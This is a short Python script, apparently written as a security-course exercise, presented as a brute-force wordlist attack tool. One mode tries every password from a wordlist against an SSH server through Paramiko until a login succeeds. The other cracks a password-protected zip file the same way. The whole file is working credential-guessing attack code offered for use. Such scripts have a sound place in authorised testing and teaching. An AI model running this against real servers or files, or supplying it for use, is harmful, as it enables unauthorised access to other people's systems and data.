#!/usr/bin/env python3
# Script Name:                  Brute Force Wordlist attack tool (Paramiko)
# Author:                       Eduardo Ayala
# Date of latest revision:      08/03/23
# Purpose:                      Automated Brute Force attack (wordlist)

# Import Libraries
import time
import paramiko

def ssh_brute_force(ip_address, username, word_list_path):
    try:
        with open(word_list_path, 'r') as file:
            for password in file:
                password = password.strip()
                try:
                    ssh_client = paramiko.SSHClient()
                    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    ssh_client.connect(hostname=ip_address, username=username, password=password)
                    print(f"Login successful! Username: {username}, Password: {password}")
                    ssh_client.close()
                    return
                except paramiko.AuthenticationException:
                    print(f"Failed: Username: {username}, Password: {password}")
                except paramiko.SSHException as e:
                    print(f"SSH Error: {e}")
                except Exception as e:
                    print(f"Error: {e}")

                time.sleep(1)  # Delay between each attempt (adjust as needed)

    except FileNotFoundError:
        print("Word list file not found.")

# Main Function
def main():
    print("SSH Brute Force Tool")
    print("1. SSH Brute Force Mode")
    print("2. Zip File Brute Force Mode")
    mode = input("Select a mode (1/2): ")

    if mode == '1':
        # SSH Brute Force Mode
        ip_address = input("Enter the IP address of the SSH server: ")
        username = input("Enter the SSH username: ")
        word_list_path = input("Enter the word list file path: ")
        ssh_brute_force(ip_address, username, word_list_path)
    elif mode == '2':
        # Zip File Brute Force Mode
        zip_file_path = input("Enter the path to the password-protected zip file: ")
        word_list_path = input("Enter the word list file path (RockYou.txt or any other word list): ")

        try:
            import zipfile

            with open(word_list_path, 'r') as file:
                for password in file:
                    password = password.strip()
                    try:
                        with zipfile.ZipFile(zip_file_path, 'r') as zip_file:
                            zip_file.extractall(pwd=password.encode())
                        print(f"Password found: {password}")
                        return
                    except zipfile.BadZipFile:
                        print("Error: Not a valid zip file.")
                        return
                    except RuntimeError:
                        print(f"Failed: Password {password}")
                    except Exception as e:
                        print(f"Error: {e}")

        except FileNotFoundError:
            print("Word list file not found.")
        except KeyboardInterrupt:
            print("User interrupted.")

if __name__ == "__main__":
    main()
